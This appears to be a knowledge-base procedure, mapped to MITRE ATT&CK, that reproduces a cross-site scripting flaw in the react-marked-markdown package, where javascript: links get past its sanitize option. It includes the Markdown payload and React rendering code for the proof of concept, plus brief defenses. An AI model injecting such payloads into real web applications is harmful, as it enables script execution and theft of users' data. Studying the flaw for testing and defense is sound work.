---
id: proc-uuid-2
tags:
  - xss
  - render
  - markdown
type: procedure
tools:
  - '[[tools/React]]'
  - '[[tools/ReactDOM]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/render-markdownpreview-xss]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:07.855Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
---

# Render-Malicious-Markdown-in-MarkdownPreview

## Summary

This procedure renders the MarkdownPreview component from react-marked-markdown with user-controlled input containing a javascript: URL, exploiting the failure to sanitize href attributes despite the sanitize: true option.

## Description

The react-marked-markdown module overrides the marked library's link renderer insecurely, passing unescaped href values to React anchor props. By providing Markdown like '[XSS](javascript: alert`1`)', the resulting <a> tag executes JavaScript on click or parse, enabling client-side attacks such as data theft in web apps processing user Markdown.

## Requirements

1. React app setup from prior procedure
2. react-marked-markdown v1.4.6 installed
3. Local server running the app (e.g., via live-server or browser open)
4. Browser console for inspection

## Defense

Defensive measures and detection strategies:

- Upgrade to patched versions or use alternative Markdown parsers with proper sanitization (e.g., DOMPurify)
- Validate and escape all user inputs before rendering
- Detect via browser dev tools for unexpected javascript: hrefs or monitor for alert executions

## Objectives

1. Inject malicious Markdown to bypass sanitization
2. Render the component to produce vulnerable anchor tags
3. Set stage for JavaScript execution

## Instructions

### Step 1: Prepare Malicious Input

**Context**: Craft the Markdown string with a javascript: payload.

**Command** (Variable assignment in JS):
```javascript
const maliciousMarkdown = '[XSS](javascript: alert`1`)';
```

> This string uses template literals for the alert payload. Expected output: String stored for rendering.

### Step 2: Render the Component

**Context**: Use ReactDOM to mount the MarkdownPreview with the tainted value and sanitize enabled.

**Command** ([[commands/render-markdownpreview-xss]]):
```javascript
import React from 'react';
import ReactDOM from 'react-dom';
import { MarkdownPreview } from 'react-marked-markdown';

ReactDOM.render(
  <MarkdownPreview
    markedOptions={{ sanitize: true }}
    value={maliciousMarkdown}
  />,
  document.getElementById('root')
);
```

> Executes in index.js. Expected output: Page shows a link labeled "XSS"; inspect element reveals <a href="javascript: alert`1`">XSS</a>.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/render-markdownpreview-xss]]

## Tools Used

- [[tools/React]]
- [[tools/ReactDOM]]

## Tags

- xss
- render
- markdown

